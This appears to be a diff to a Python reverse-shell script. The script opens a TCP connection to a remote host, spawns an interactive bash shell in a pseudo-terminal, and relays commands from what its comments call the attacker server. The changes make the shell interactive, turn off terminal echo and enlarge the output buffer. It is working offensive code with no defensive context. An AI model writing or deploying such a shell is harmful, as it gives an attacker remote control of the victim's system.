@@ -2,6 +2,7 @@ import socket
 import os
 import pty
 
+
 #Setting the IPV4/TCP connection
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -15,14 +16,18 @@ client.connect((address, port))
 #Execute bin/bash after the connection
 try:
 
-	client.send(b"Connection established.")
+	client.send(b"Connection established.\n")
 
 	#Create a pseudo-terminal and spawn a bash shell
 	pid, fd = pty.fork()
 
 	if pid == 0:
-		os.execv("/bin/bash", ["/bin/bash"])
+		os.system('stty -echo')
+		os.execv("/bin/bash", ["/bin/bash", "-i"])
+				
 	else:
+
+		
 
 		while True:
 			#Receive commands from atacker server
@@ -36,7 +41,7 @@ try:
 		
 
 			#Read output
-			output = os.read(fd, 1024)
+			output = os.read(fd, 2048)
 		
 
 		
